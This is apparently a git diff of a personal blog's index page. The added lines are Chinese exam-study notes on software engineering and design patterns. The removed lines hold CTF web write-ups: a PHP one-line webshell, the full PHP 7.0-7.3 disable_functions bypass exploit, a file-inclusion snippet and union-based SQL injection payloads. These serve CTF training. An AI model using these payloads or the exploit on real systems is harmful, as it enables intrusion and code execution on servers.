+<h6 id="极限编程（XP）"><a href="#极限编程（XP）" class="headerlink" title="极限编程（XP）"></a>极限编程（XP）</h6><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410170000221.png" alt="image-20241017000056154"></p>
+<h4 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h4><h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410170001159.png" alt="image-20241017000144052"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410170002247.png" alt="image-20241017000210133"></p>
+<h5 id="获取方法"><a href="#获取方法" class="headerlink" title="获取方法"></a>获取方法</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410170002015.png" alt="image-20241017000227962"></p>
+<h4 id="系统设计"><a href="#系统设计" class="headerlink" title="系统设计"></a>系统设计</h4><h5 id="采用了结构化方法的结构化设计"><a href="#采用了结构化方法的结构化设计" class="headerlink" title="采用了结构化方法的结构化设计"></a>采用了结构化方法的结构化设计</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410170003715.png" alt="image-20241017000309613"></p>
+<h5 id="内聚和耦合"><a href="#内聚和耦合" class="headerlink" title="内聚和耦合"></a>内聚和耦合</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410170005801.png" alt="image-20241017000516743"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410170006971.png" alt="image-20241017000609915"></p>
+<h4 id="系统测试"><a href="#系统测试" class="headerlink" title="系统测试"></a>系统测试</h4><h5 id="原则与目的"><a href="#原则与目的" class="headerlink" title="原则与目的"></a>原则与目的</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212027145.png" alt="image-20241021202735977"></p>
+<h5 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212028123.png" alt="image-20241021202811071"></p>
+<h5 id=""><a href="#" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212028863.png" alt="image-20241021202839741"></h5><h5 id="测试阶段"><a href="#测试阶段" class="headerlink" title="测试阶段"></a>测试阶段</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212029846.png" alt="image-20241021202925718"></p>
+<h4 id="软件开发项目管理"><a href="#软件开发项目管理" class="headerlink" title="软件开发项目管理"></a>软件开发项目管理</h4><h5 id="Gantt图"><a href="#Gantt图" class="headerlink" title="Gantt图"></a>Gantt图</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212030414.png" alt="image-20241021203033309"></p>
+<h5 id="PERT图"><a href="#PERT图" class="headerlink" title="PERT图"></a>PERT图</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212031327.png" alt="image-20241021203131219"></p>
+<h5 id="例"><a href="#例" class="headerlink" title="例"></a>例</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212035536.png" alt="image-20241021203543415"></p>
+<p>答案：d，c</p>
+<h5 id="风险管理"><a href="#风险管理" class="headerlink" title="风险管理"></a>风险管理</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212036207.png" alt="image-20241021203616149"></p>
+<h5 id="软件质量特性"><a href="#软件质量特性" class="headerlink" title="软件质量特性"></a>软件质量特性</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212036637.png" alt="image-20241021203637519"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212037540.png" alt="image-20241021203737425"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212038429.png" alt="image-20241021203813305"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212038906.png" alt="image-20241021203842795"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212038504.png" alt="image-20241021203856389"></p>
+<h4 id="软件度量"><a href="#软件度量" class="headerlink" title="软件度量"></a>软件度量</h4><h5 id="McCabe度量法"><a href="#McCabe度量法" class="headerlink" title="McCabe度量法"></a>McCabe度量法</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212039220.png" alt="image-20241021203950062"></p>
 
             
         </div>
@@ -462,12 +510,12 @@
         
         
     </div>
-    <a href="/2024/06/20/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/BJDCTF2020-EzPHP/" class="go-post">阅读全文</a>
+    <a href="/2024/10/23/%E8%BD%AF%E8%80%83/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
-    <a href="/2024/06/20/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/GYCTF2020-EasyThinking/">
-        <h2 class="post-title">[GYCTF2020]EasyThinking</h2>
+    <a href="/2024/10/23/%E8%BD%AF%E8%80%83/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%8A%80%E6%9C%AF/">
+        <h2 class="post-title"></h2>
     </a>
     <div class="category-and-date">
         
@@ -475,7 +523,7 @@
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2024/6/20
+            2024/10/23
         </span>
         
         
@@ -483,30 +531,27 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p>一开始看到我还以为是二次注入呢</p>
-<p>但是尝试之后发现不是</p>
-<p>所以看看wp</p>
-<p>发现是thinkphp框架</p>
-<p>所以先看看是哪个版本</p>
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406201922989.png" alt="image-20240620192237924"></p>
-<p><strong>session可控，修改session，长度为32位，session后缀改为.php（加上.php后为32位）<br>然后再search搜索的内容会直接保存在&#x2F;runtime&#x2F;session&#x2F;目录下</strong></p>
-<p>所以我们注册账号，并在登陆时将session改为32位的php文件</p>
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406201947562.png" alt="image-20240620194714529"></p>
-<p>登录之后将在搜索中搜索</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[why]);?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>一句话木马上传完毕，这个木马会保存在session文件中</p>
-<p>路径为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">runtime/session/sess_1234567812345678123456781234.php</span><br></pre></td></tr></table></figure>
-
-<p>蚁剑连接</p>
-<p>成功之后我们发现无法读取flag，这里要绕过disable_functions</p>
-<p>上传exp</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span><br><span class="line">#</span><br><span class="line"># Bug: https://bugs.php.net/bug.php?id=72530</span><br><span class="line">#</span><br><span class="line"># This exploit should work on all PHP 7.0-7.3 versions</span><br><span class="line">#</span><br><span class="line"># Author: https://github.com/mm0r1</span><br><span class="line"></span><br><span class="line">pwn(&quot;/readflag&quot;);</span><br><span class="line"></span><br><span class="line">function pwn($cmd) &#123;</span><br><span class="line">    global $abc, $helper;</span><br><span class="line"></span><br><span class="line">    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;</span><br><span class="line">        $address = 0;</span><br><span class="line">        for($j = $s-1; $j &gt;= 0; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= 8;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        return $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function ptr2str($ptr, $m = 8) &#123;</span><br><span class="line">        $out = &quot;&quot;;</span><br><span class="line">        for ($i=0; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; 0xff);</span><br><span class="line">            $ptr &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function write(&amp;$str, $p, $v, $n = 8) &#123;</span><br><span class="line">        $i = 0;</span><br><span class="line">        for($i = 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = chr($v &amp; 0xff);</span><br><span class="line">            $v &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function leak($addr, $p = 0, $s = 8) &#123;</span><br><span class="line">        global $abc, $helper;</span><br><span class="line">        write($abc, 0x68, $addr + $p - 0x10);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;</span><br><span class="line">        return $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function parse_elf($base) &#123;</span><br><span class="line">        $e_type = leak($base, 0x10, 2);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, 0x20);</span><br><span class="line">        $e_phentsize = leak($base, 0x36, 2);</span><br><span class="line">        $e_phnum = leak($base, 0x38, 2);</span><br><span class="line"></span><br><span class="line">        for($i = 0; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, 0, 4);</span><br><span class="line">            $p_flags = leak($header, 4, 4);</span><br><span class="line">            $p_vaddr = leak($header, 0x10);</span><br><span class="line">            $p_memsz = leak($header, 0x28);</span><br><span class="line"></span><br><span class="line">            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; # PT_LOAD, PF_Read_Write</span><br><span class="line">                # handle pie</span><br><span class="line">                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; # PT_LOAD, PF_Read_exec</span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            return false;</span><br><span class="line"></span><br><span class="line">        return [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_basic_funcs($base, $elf) &#123;</span><br><span class="line">        list($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                # &#x27;constant&#x27; constant check</span><br><span class="line">                if($deref != 0x746e6174736e6f63)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + 4) * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                # &#x27;bin2hex&#x27; constant check</span><br><span class="line">                if($deref != 0x786568326e6962)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"></span><br><span class="line">            return $data_addr + $i * 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_binary_base($binary_leak) &#123;</span><br><span class="line">        $base = 0;</span><br><span class="line">        $start = $binary_leak &amp; 0xfffffffffffff000;</span><br><span class="line">        for($i = 0; $i &lt; 0x1000; $i++) &#123;</span><br><span class="line">            $addr = $start - 0x1000 * $i;</span><br><span class="line">            $leak = leak($addr, 0, 7);</span><br><span class="line">            if($leak == 0x10102464c457f) &#123; # ELF header</span><br><span class="line">                return $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function get_system($basic_funcs) &#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        do &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, 0, 6);</span><br><span class="line"></span><br><span class="line">            if($f_name == 0x6d6574737973) &#123; # system</span><br><span class="line">                return leak($addr + 8);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += 0x20;</span><br><span class="line">        &#125; while($f_entry != 0);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class ryat &#123;</span><br><span class="line">        var $ryat;</span><br><span class="line">        var $chtg;</span><br><span class="line"></span><br><span class="line">        function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;chtg = $this-&gt;ryat;</span><br><span class="line">            $this-&gt;ryat = 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class Helper &#123;</span><br><span class="line">        public $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123;</span><br><span class="line">        die(&#x27;This PoC is for *nix systems only.&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = 10; # increase this value if you get segfaults</span><br><span class="line"></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    for($i = 0; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_repeat(&#x27;A&#x27;, 79);</span><br><span class="line"></span><br><span class="line">    $poc = &#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;;</span><br><span class="line">    $out = unserialize($poc);</span><br><span class="line">    gc_collect_cycles();</span><br><span class="line"></span><br><span class="line">    $v = [];</span><br><span class="line">    $v[0] = ptr2str(0, 79);</span><br><span class="line">    unset($v);</span><br><span class="line">    $abc = $out[2][0];</span><br><span class="line"></span><br><span class="line">    $helper = new Helper;</span><br><span class="line">    $helper-&gt;b = function ($x) &#123; &#125;;</span><br><span class="line"></span><br><span class="line">    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;</span><br><span class="line">        die(&quot;UAF failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # leaks</span><br><span class="line">    $closure_handlers = str2ptr($abc, 0);</span><br><span class="line">    $php_heap = str2ptr($abc, 0x58);</span><br><span class="line">    $abc_addr = $php_heap - 0xc8;</span><br><span class="line"></span><br><span class="line">    # fake value</span><br><span class="line">    write($abc, 0x60, 2);</span><br><span class="line">    write($abc, 0x70, 6);</span><br><span class="line"></span><br><span class="line">    # fake reference</span><br><span class="line">    write($abc, 0x10, $abc_addr + 0x60);</span><br><span class="line">    write($abc, 0x18, 0xa);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, 0x20);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, 8);</span><br><span class="line">    if(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t determine binary base address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t parse ELF header&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get basic_functions address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get zif_system address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # fake closure object</span><br><span class="line">    $fake_obj_offset = 0xd0;</span><br><span class="line">    for($i = 0; $i &lt; 0x110; $i += 8) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # pwn</span><br><span class="line">    write($abc, 0x20, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, 0xd0 + 0x38, 1, 4); # internal func type</span><br><span class="line">    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler</span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line"></span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202004375.png" alt="image-20240620200423324"></p>
-<p>之后访问1.php</p>
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202004946.png" alt="image-20240620200439923"></p>
+            <h3 id="面向对象技术"><a href="#面向对象技术" class="headerlink" title="面向对象技术"></a>面向对象技术</h3><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410230301014.png" alt="image-20241023030152837"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410230315695.png" alt="image-20241023031538588"></p>
+<h5 id="多态（例）"><a href="#多态（例）" class="headerlink" title="多态（例）"></a>多态（例）</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410230317797.png" alt="image-20241023031741713"></p>
+<p>答案：a</p>
+<h4 id="设计原则"><a href="#设计原则" class="headerlink" title="设计原则"></a>设计原则</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410230318807.png" alt="image-20241023031821674"></p>
+<h4 id="设计模式的概念和分类"><a href="#设计模式的概念和分类" class="headerlink" title="设计模式的概念和分类"></a>设计模式的概念和分类</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410230320541.png" alt="image-20241023032013419"></p>
+<h4 id="设计模式的概念与分类"><a href="#设计模式的概念与分类" class="headerlink" title="设计模式的概念与分类"></a>设计模式的概念与分类</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410230321122.png" alt="image-20241023032148053"></p>
+<h4 id="创建型模式"><a href="#创建型模式" class="headerlink" title="创建型模式"></a>创建型模式</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410230323997.png" alt="image-20241023032307878"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410230328232.png" alt="image-20241023032841170"></p>
+<h4 id="结构性模式"><a href="#结构性模式" class="headerlink" title="结构性模式"></a>结构性模式</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410230329634.png" alt="image-20241023032952554"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410230330738.png" alt="image-20241023033013645"></p>
+<h4 id="行为型模式"><a href="#行为型模式" class="headerlink" title="行为型模式"></a>行为型模式</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410230331547.png" alt="image-20241023033122451"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410230331105.png" alt="image-20241023033152032"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410230332852.png" alt="image-20241023033257769"></p>
+<h4 id="Java程序设计"><a href="#Java程序设计" class="headerlink" title="Java程序设计"></a>Java程序设计</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410230333482.png" alt="image-20241023033359342"></p>
+<h5 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410230334432.png" alt="image-20241023033435295"></p>
+<h5 id="类"><a href="#类" class="headerlink" title="类"></a>类</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410230336404.png" alt="image-20241023033612306"></p>
+<h5 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410230336525.png" alt="image-20241023033647417"></p>
+<h5 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410230337525.png" alt="image-20241023033732426"></p>
+<h5 id="关键字（this-super-final）"><a href="#关键字（this-super-final）" class="headerlink" title="关键字（this\super\final）"></a>关键字（this\super\final）</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410230338329.png" alt="image-20241023033853211"></p>
+<h5 id="抽象类和接口"><a href="#抽象类和接口" class="headerlink" title="抽象类和接口"></a>抽象类和接口</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410230339528.png" alt="image-20241023033943394"></p>
 
             
         </div>
@@ -516,12 +561,12 @@
         
         
     </div>
-    <a href="/2024/06/20/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/GYCTF2020-EasyThinking/" class="go-post">阅读全文</a>
+    <a href="/2024/10/23/%E8%BD%AF%E8%80%83/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%8A%80%E6%9C%AF/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
-    <a href="/2024/06/20/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9B-AliceWebsite/">
-        <h2 class="post-title">[网鼎杯 2020 半决赛]AliceWebsite</h2>
+    <a href="/2024/10/23/%E8%BD%AF%E8%80%83/%E7%BB%93%E6%9E%84%E5%8C%96%E5%BC%80%E5%8F%91%E6%96%B9%E6%B3%95%EF%BC%88%E6%95%B0%E6%8D%AE%E6%B5%81%E5%9B%BE%EF%BC%89/">
+        <h2 class="post-title"></h2>
     </a>
     <div class="category-and-date">
         
@@ -529,7 +574,7 @@
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2024/6/20
+            2024/10/23
         </span>
         
         
@@ -537,12 +582,26 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p>发现源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">       $action = (isset($_GET[&#x27;action&#x27;]) ? $_GET[&#x27;action&#x27;] : &#x27;home.php&#x27;);</span><br><span class="line">       if (file_exists($action)) &#123;</span><br><span class="line">           include $action;</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           echo &quot;File not found!&quot;;</span><br><span class="line">       &#125;</span><br><span class="line">       ?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>很快发现文件包含</p>
-<p>同时我们发现这里有一个文件包含,上面的代码并没有任何限制,可以利用可控变量action来访问flag</p>
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406201909085.png" alt="image-20240620190853439"></p>
+            <h3 id="结构化开发方法（数据流图）"><a href="#结构化开发方法（数据流图）" class="headerlink" title="结构化开发方法（数据流图）"></a>结构化开发方法（数据流图）</h3><h4 id="系统设计基本原理"><a href="#系统设计基本原理" class="headerlink" title="系统设计基本原理"></a>系统设计基本原理</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212133765.png" alt="image-20241021213336672"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212133666.png" alt="image-20241021213359566"></p>
+<h5 id="耦合"><a href="#耦合" class="headerlink" title="耦合"></a>耦合</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212135072.png" alt="image-20241021213503020"></p>
+<h5 id="内聚"><a href="#内聚" class="headerlink" title="内聚"></a>内聚</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212135018.png" alt="image-20241021213557971"></p>
+<h5 id="例"><a href="#例" class="headerlink" title="例"></a>例</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212136288.png" alt="image-20241021213628206"></p>
+<p>答案：a</p>
+<h4 id="系统总体机构设计"><a href="#系统总体机构设计" class="headerlink" title="系统总体机构设计"></a>系统总体机构设计</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212137156.png" alt="image-20241021213715075"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212138979.png" alt="image-20241021213814897"></p>
+<h5 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212138472.png" alt="image-20241021213836363"></p>
+<h4 id="数据流图"><a href="#数据流图" class="headerlink" title="数据流图"></a>数据流图</h4><h5 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212139629.png" alt="image-20241021213944515"></p>
+<h5 id="数据字典"><a href="#数据字典" class="headerlink" title="数据字典"></a>数据字典</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212140499.png" alt="image-20241021214028451"></p>
+<h5 id="基本成分"><a href="#基本成分" class="headerlink" title="基本成分"></a>基本成分</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212151094.png" alt="image-20241021215139038"></p>
+<h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212152290.png" alt="image-20241021215230253"></p>
+<h5 id="对图和加工进行编号"><a href="#对图和加工进行编号" class="headerlink" title="对图和加工进行编号"></a>对图和加工进行编号</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212156276.png" alt="image-20241021215600190"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212156428.png" alt="image-20241021215633353"></p>
+<h5 id="应注意的问题"><a href="#应注意的问题" class="headerlink" title="应注意的问题"></a>应注意的问题</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212157278.png" alt="image-20241021215709188"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212158249.png" alt="image-20241021215853164"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212159462.png" alt="image-20241021215915385"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212200584.png" alt="image-20241021220016507"></p>
+<h4 id="数据流图的分层"><a href="#数据流图的分层" class="headerlink" title="数据流图的分层"></a>数据流图的分层</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410212137046.png" alt="image-20241021213737010"></p>
 
             
         </div>
@@ -552,12 +611,12 @@
         
         
     </div>
-    <a href="/2024/06/20/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9B-AliceWebsite/" class="go-post">阅读全文</a>
+    <a href="/2024/10/23/%E8%BD%AF%E8%80%83/%E7%BB%93%E6%9E%84%E5%8C%96%E5%BC%80%E5%8F%91%E6%96%B9%E6%B3%95%EF%BC%88%E6%95%B0%E6%8D%AE%E6%B5%81%E5%9B%BE%EF%BC%89/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
-    <a href="/2024/06/19/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/October-2019-Twice-SQL-Injection/">
-        <h2 class="post-title">October 2019 Twice SQL Injection</h2>
+    <a href="/2024/10/23/%E8%BD%AF%E8%80%83/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%BB%84%E6%88%90/">
+        <h2 class="post-title"></h2>
     </a>
     <div class="category-and-date">
         
@@ -565,7 +624,7 @@
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2024/6/19
+            2024/10/23
         </span>
         
         
@@ -573,28 +632,47 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192151163.png" alt="image-20240619215157126"></p>
-<p>题目告诉了我二次注入，我就先登录进去看看</p>
-<p>随便注册</p>
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192152391.png" alt="image-20240619215237364"></p>
-<p>在这一块，输入 ‘ 会被转义，但是我们发现并没有其他的什么特殊限制，所以可以大胆猜测在注册界面二次注入</p>
-<p>所以首先，我们尝试一些恶意注册的名字</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select database() #</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192155487.png" alt="image-20240619215549456"></p>
-<p>很好，所以之后还是继续爆表</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctftraining&#x27; #</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192156562.png" alt="image-20240619215634536"></p>
-<p>猜测在flag中</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;#</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192157836.png" alt="image-20240619215718815"></p>
-<p>最后爆字段</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select flag from flag #</span><br></pre></td></tr></table></figure>
-
